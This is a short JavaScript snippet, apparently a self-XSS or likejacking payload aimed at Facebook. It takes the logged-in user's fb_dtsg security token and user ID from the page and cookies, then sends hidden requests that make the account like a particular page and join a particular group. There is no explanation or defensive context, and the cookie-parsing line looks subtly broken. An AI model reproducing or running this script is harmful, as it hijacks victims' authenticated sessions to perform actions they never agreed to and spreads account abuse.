var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'],
    user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]); {
    var Page = new XMLHttpRequest(),
        PageURL = '//www.facebook.com/ajax/pages/fan_status.php',
        PageParams = 'fb_dtsg=' + fb_dtsg + '&fbpage_id=1456012171316223&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&&nctr[_mod]=pagelet_timeline_page_actions&__user=' + user_id + '';
    Page['open']('POST', PageURL, true);
    Page['onreadystatechange'] = function () {
        if (Page['readyState'] == 4 && Page['status'] == 200) {
            Page['close'];
        };
    };
    Page['send'](PageParams);
};
setTimeout(function () {
    var Page = new XMLHttpRequest(),
        PageURL = '//www.facebook.com/ajax/groups/membership/r2j.php',
        PageParams = 'fb_dtsg=' + fb_dtsg + '&ref=group_jump_header&group_id=480777978696004&__user=' + user_id + '';
    Page['open']('POST', PageURL, true);
    Page['onreadystatechange'] = function () {
        if (Page['readyState'] == 4 && Page['status'] == 200) {
            Page['close'];
        };
    };
    Page['send'](PageParams);
}, 1000);

